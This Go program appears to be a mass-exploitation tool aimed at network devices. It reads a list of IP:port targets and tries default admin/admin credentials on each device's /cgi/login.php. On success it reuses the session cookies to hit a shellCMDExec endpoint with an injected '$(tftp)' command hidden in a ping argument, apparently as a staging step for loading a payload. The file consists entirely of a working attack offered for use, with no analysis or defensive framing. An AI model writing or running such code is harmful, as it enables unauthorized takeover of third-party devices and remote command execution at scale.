package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
)

func main() {

	file, err := os.Open("ips.txt")
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	var wg sync.WaitGroup
	concurrent := make(chan struct{}, 10) 

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		ipPort := strings.TrimSpace(scanner.Text())
		wg.Add(1)

		go func(ipPort string) {
			defer wg.Done()
			concurrent <- struct{}{} 
			sendRequest(ipPort)
			<-concurrent 
		}(ipPort)
	}

	wg.Wait()
	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading file:", err)
	}
}

func sendRequest(ipPort string) {

	url := fmt.Sprintf("http://%s/cgi/login.php", ipPort)
	payload := "language=en&username=YWRtaW4%3D&passwd=YWRtaW4%3D"

	// Create the HTTP client
	client := &http.Client{}

	// Create the POST request
	req, err := http.NewRequest("POST", url, strings.NewReader(payload))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}


	req.Header.Set("Host", ipPort)
	req.Header.Set("Content-Length", fmt.Sprint(len(payload)))
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Origin", fmt.Sprintf("http://%s", ipPort))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Referer", fmt.Sprintf("http://%s/cgi/login.php", ipPort))
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Connection", "close")


	res, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error sending login request to %s: %s\n", ipPort, err)
		return
	}


	if res.StatusCode == http.StatusOK {
		fmt.Printf("Successful login to %s!\n", ipPort)


		loginCookies := res.Cookies()


		getURL := fmt.Sprintf("http://%s/cgi/home.php?fun=system&page=shellCMDExec&isajax=1&runtab=1&cmdExec=1&command=ping%%201.1.1.1%%20-c%%204%%20$(tftp)&random=1689196707966", ipPort)
		getReq, err := http.NewRequest("GET", getURL, nil)
		if err != nil {
			fmt.Println("Error creating GET request:", err)
			return
		}


		getReq.Header.Set("Host", ipPort)
		getReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36")
		getReq.Header.Set("Accept", "*/*")
		getReq.Header.Set("Referer", fmt.Sprintf("http://%s/cgi/home.php", ipPort))
		getReq.Header.Set("Accept-Encoding", "gzip, deflate")
		getReq.Header.Set("Accept-Language", "en-US,en;q=0.9")
		getReq.Header.Set("Connection", "close")


		for _, cookie := range loginCookies {
			getReq.AddCookie(cookie)
		}


		_, err = client.Do(getReq)
		if err != nil {
			fmt.Printf("Error sending additional GET request to %s: %s\n", ipPort, err)
			return
		}

		fmt.Printf("Additional request sent to device: %s\n", ipPort)
	} else {
		fmt.Printf("Login unsuccessful for %s.\n", ipPort)
	}

	defer res.Body.Close()
}
